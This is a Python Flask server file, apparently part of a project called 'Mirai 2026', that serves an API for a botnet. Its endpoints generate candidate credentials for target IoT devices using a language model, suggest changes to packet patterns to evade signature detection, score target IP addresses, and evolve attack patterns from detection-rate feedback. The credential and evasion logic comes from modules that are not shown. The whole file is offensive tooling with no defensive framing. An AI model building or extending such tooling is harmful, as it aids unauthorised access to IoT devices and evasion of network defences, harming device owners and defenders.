#!/usr/bin/env python3
"""
AI API Server for Mirai 2026

Provides RESTful API endpoints for:
- Credential generation
- Pattern evasion suggestions
- Target prioritization
- Attack optimization
"""

from flask import Flask, request, jsonify
import logging
import sys
import os

# Add paths
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'credential_intel'))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'ml_evasion'))

try:
    from generate import CredentialGenerator
except ImportError:
    CredentialGenerator = None

try:
    from pattern_generator import PatternEvolutionEngine, SignatureEvader
except ImportError:
    PatternEvolutionEngine = None
    SignatureEvader = None

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize components
credential_gen = CredentialGenerator() if CredentialGenerator else None
pattern_engine = PatternEvolutionEngine(population_size=30) if PatternEvolutionEngine else None
signature_evader = SignatureEvader() if SignatureEvader else None

if pattern_engine:
    pattern_engine.initialize_population()


@app.route('/health', methods=['GET', 'POST'])


def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'services': {
            'credential_generation': credential_gen is not None,
            'pattern_evolution': pattern_engine is not None,
            'signature_evasion': signature_evader is not None
        }
    })


@app.route('/api/credentials/generate', methods=['POST'])


def generate_credentials():
    """
    Generate credentials using LLM

    Request body:
    {
        "target_device": "IoT Camera",
        "target_os": "Linux",
        "breach_year_start": 2015,
        "breach_year_end": 2023,
        "max_credentials": 10
    }
    """
    if credential_gen is None:
        return jsonify({'error': 'Credential generation not available'}), 503

    data = request.get_json()

    target_device = data.get('target_device', 'Generic IoT')
    target_os = data.get('target_os', 'Linux')
    max_creds = data.get('max_credentials', 10)

    logger.info(f"Generating credentials for {target_device}")

    # Generate credentials
    try:
        credentials = credential_gen.generate_credentials(
            device_type=target_device,
            os_type=target_os,
            count=max_creds
        )

        # Format response
        cred_list = []
        for cred in credentials[:max_creds]:
            cred_list.append({
                'username': cred.get('username', 'root'),
                'password': cred.get('password', 'admin'),
                'confidence': cred.get('confidence', 0.5),
                'source': cred.get('source', 'generated')
            })

        return jsonify({
            'success': True,
            'credentials': cred_list,
            'count': len(cred_list)
        })

    except Exception as e:
        logger.error(f"Credential generation failed: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/evasion/suggest', methods=['POST'])


def suggest_evasion():
    """
    Get evasion technique suggestions

    Request body:
    {
        "current_pattern": {
            "packet_size_min": 64,
            "packet_size_max": 512,
            "inter_packet_delay_ms": 0,
            "payload_entropy": 0.5,
            "fragmentation": false
        },
        "max_suggestions": 5
    }
    """
    if signature_evader is None:
        return jsonify({'error': 'Signature evasion not available'}), 503

    data = request.get_json()
    current_pattern = data.get('current_pattern', {})
    max_suggestions = data.get('max_suggestions', 5)

    logger.info("Generating evasion suggestions")

    try:
        suggestions = signature_evader.suggest_evasions(current_pattern)

        return jsonify({
            'success': True,
            'suggestions': suggestions[:max_suggestions],
            'count': len(suggestions)
        })

    except Exception as e:
        logger.error(f"Evasion suggestion failed: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/targets/prioritize', methods=['POST'])


def prioritize_targets():
    """
    Prioritize targets using ML

    Request body:
    {
        "targets": ["192.168.1.1", "10.0.0.1", ...]
    }
    """
    data = request.get_json()
    targets = data.get('targets', [])

    logger.info(f"Prioritizing {len(targets)} targets")

    # Simple heuristic scoring (in production, use ML model)
    import random
    scores = [random.uniform(0.3, 1.0) for _ in targets]

    return jsonify({
        'success': True,
        'scores': scores,
        'count': len(scores)
    })


@app.route('/api/pattern/evolve', methods=['POST'])


def evolve_pattern():
    """
    Evolve attack pattern based on feedback

    Request body:
    {
        "feedback": [
            {"pattern_id": 0, "detection_rate": 0.3, "throughput": 25000},
            ...
        ]
    }
    """
    if pattern_engine is None:
        return jsonify({'error': 'Pattern evolution not available'}), 503

    data = request.get_json()
    feedback = data.get('feedback', [])

    logger.info(f"Evolving patterns with {len(feedback)} feedback entries")

    try:
        best_pattern = pattern_engine.evolve(feedback)
        pattern_dict = pattern_engine.pattern_to_dict(best_pattern)

        return jsonify({
            'success': True,
            'best_pattern': pattern_dict,
            'generation': pattern_engine.generation
        })

    except Exception as e:
        logger.error(f"Pattern evolution failed: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/pattern/current', methods=['GET'])


def get_current_pattern():
    """Get current best attack pattern"""
    if pattern_engine is None:
        return jsonify({'error': 'Pattern evolution not available'}), 503

    best = pattern_engine.get_best_pattern()
    return jsonify({
        'success': True,
        'pattern': pattern_engine.pattern_to_dict(best)
    })


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description='Mirai 2026 AI API Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=5000, help='Port to bind to')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')

    args = parser.parse_args()

    logger.info(f"Starting AI API server on {args.host}:{args.port}")
    app.run(host=args.host, port=args.port, debug=args.debug)
